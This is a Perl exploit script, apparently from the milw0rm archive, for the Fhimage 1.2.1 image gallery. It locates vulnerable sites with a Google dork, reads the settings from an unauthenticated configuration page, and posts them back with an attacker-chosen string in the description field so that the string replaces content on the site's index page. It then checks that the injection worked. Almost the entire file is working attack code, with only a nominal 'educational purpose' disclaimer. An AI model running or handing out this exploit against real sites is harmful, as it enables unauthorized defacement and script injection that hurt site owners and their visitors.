#!/usr/bin/perl

# -----------------------------------------------------------------------------------------------
#                      INFORMATIONS
# -----------------------------------------------------------------------------------------------
# Fhimage 1.2.1
# http://www.flash-here.com/downloads/download.php?id=9
# Remote Index Change Exploit
# by Osirys
# osirys[at]live[dot]it
# osirys.org
# Thanks: x0r

# With this exploit, you will able to change index.php content

##   # ONLY FOR EDUCATIONAL PURPOSE. THE AUTHOR IS NOT RESPONSABLE OF ANY
##   # IMPROPERLY USE OF THIS EXPLOIT. USE IT AT YOUR OWN RISK !!

# Google Dork: FhImage, powered by Flash-here.com


use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;

my $conf_path   = "/imgconfig/index.php?mode=write";
my $index_PATH  = "/index.php";


my $host   = $ARGV[0];
my $string_to_inj = $ARGV[1];

(($host)&&($string_to_inj)) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

$test_url = $host.$conf_path;
$test_re = get_req($test_url);

if ($test_re !~ /Config Settings/) {
    print "[-] Configuration file not found, or insufficent permissions \n";
    print "[-] Exploit failed ! \n";
    exit(0);
}
else {
    print "[+] Configuration file found ! \n";

    get_old_data($test_url);
    my $url  = $path.$conf_path;

    my $post = "g_title=".$t."&g_desc=".$string_to_inj."&g_bgcolor=".$g1."&g_titlecolor=".$g2."&g_".
               "desccolor=".$g3."&g_textcolor=".$g4."&g_linkcolor=".$g5."&g_vlinkcolor=".$g6."&g_c".
               "ols=".$g7."&g_rows=".$g8."&g_thumb_worh=".$g9."&g_twidth=".$g10."&g_spacing=". $g11.
               "&g_dispFn=check&g_sortByFn=check&g_insensitive_sort=check&g_folderImg=&g_popupWidt".
               "h=400&g_popupHeight=400";

    my $length = length($post);

    my $socket   =  new IO::Socket::INET(
                                          PeerAddr => $h0st,
                                          PeerPort => '80',
                                          Proto    => 'tcp',
                                        ) or die "[-] Can't connect to $h0st:80\n[?] $! \n\n";

    my $data = "POST ".$url." HTTP/1.1\r\n".
               "Host: ".$h0st."\r\n".
               "Keep-Alive: 300\r\n".
               "Connection: keep-alive\r\n".
               "Content-Type: application/x-www-form-urlencoded\r\n".
               "Content-Length: ".$length."\r\n\r\n".
               $post."\r\n";

    print "[+] Chaning index content ..\n";
    $socket->send($data);

    while ((my $e = <$socket>)&&($inj_t != 1)) {
        if ($e =~ /Settings Saved/) {
            $inj_t = 1;
        }
    }

    $inj_t == 1 || die "[-] Unable to change index content ! \n";
    &expl_cheek;
}

sub expl_cheek {
    my $url = $host.$index_PATH;
    my $re = get_req($url);
    if ($re =~ /class="desc">$string_to_inj<\/div>/) {
        print "[+] Exploit succesfull !\n";
        print "[+] Index changed, go and have a look !\n";
        exit(0);
    }
    else {
        print "[-] Exploit failed\n";
        print "[?] Something went wrong\n";
        exit(0);
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub get_old_data() {
    my $url = $_[0];
    my $re = &get_req($url);
    if ($re =~ /name="g_title" size="50" value="(.*)">/)                                                                 { $t = $1; }
    if ($re =~ /g_bgcolor'\)" cols="7" maxlength="7" value="#([0-9a-zA-Z]{6})">/)                                        { $g1 = "\%23".$1; }
    if ($re =~ /g_titlecolor'\)" cols="7" maxlength="7" value="#([0-9a-zA-Z]{6})">/)                                     { $g2 = "\%23".$1; }
    if ($re =~ /g_desccolor'\)" cols="7" maxlength="7" value="#([0-9a-zA-Z]{6})">/)                                      { $g3 = "\%23".$1; }
    if ($re =~ /g_textcolor'\)" cols="7" maxlength="7" value="#([0-9a-zA-Z]{6})">/)                                      { $g4 = "\%23".$1; }
    if ($re =~ /g_linkcolor'\)" cols="7" maxlength="7" value="#([0-9a-zA-Z]{6})">/)                                      { $g5 = "\%23".$1; }
    if ($re =~ /g_vlinkcolor'\)" cols="7" maxlength="7" value="#([0-9a-zA-Z]{6})">/)                                     { $g6 = "\%23".$1; }
    if ($re =~ /g_cols" cols="50" value="([0-9]{1,3})"> /)                                                               { $g7 = $1; }
    if ($re =~ /g_rows" cols="50" value="([0-9]{1,3})"> /)                                                               { $g8 = $1; }
    if (($re =~ /g_thumb_worh" type="radio" value="w" checked >/)&&($re =~ /g_twidth" cols="50" value="([0-9]{1,5})">/)) { ($g9,$g10) = ("w",$1); }
    if (($re =~ /g_thumb_worh" type="radio" value="h" checked >/)&&($re =~ /g_twidth" cols="50" value="([0-9]{1,5})">/)) { ($g9,$g10) = ("h",$1); }
    if ($re =~ /g_spacing" type="text" id="g_spacing" value="([0-9]{1,5})">/) { $g11 = $1; }
}

sub banner {
    print "\n".
          "  ----------------------------------------- \n".
          "     Fhimage Remote Index Change Exploit    \n".
          "                Coded by Osirys             \n".
          "     [*] The author is not responsable      \n".
          "                of any violation            \n".
          "  ----------------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Bad hostname or missing string to inject! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path string_to_inject\n\n";
    exit(0);
}

# milw0rm.com [2009-01-19]